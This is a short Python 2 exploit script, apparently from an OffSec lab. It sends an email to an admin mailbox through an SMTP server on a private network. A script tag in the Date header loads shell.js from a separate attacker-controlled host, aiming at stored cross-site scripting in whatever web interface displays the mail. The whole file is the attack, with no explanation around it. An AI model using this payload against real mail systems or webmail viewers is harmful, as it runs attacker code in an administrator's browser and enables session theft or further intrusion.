#!/usr/bin/python
import smtplib
from smtplib import SMTPException

sender = 'victims@offsec.local'
receivers = 'admin@offsec.local'

message = """From: victim@offsec.local"
To: admin@offsec.local
Date: <script src="http://192.168.11.245/shell.js"></script>
MIME-Version: 1.0
Content-type: text/html
Subject: XSS alerts

This is an e-mail message to be sent in HTML format

<b>This is HTML message.</b>
<h1>This is headline.</h1>
"""

try:
   smtpObj = smtplib.SMTP('192.168.11.236')
   smtpObj.sendmail(sender, receivers, message)         
   print "Successfully sent email"
except SMTPException:
   print "Error: unable to send email"
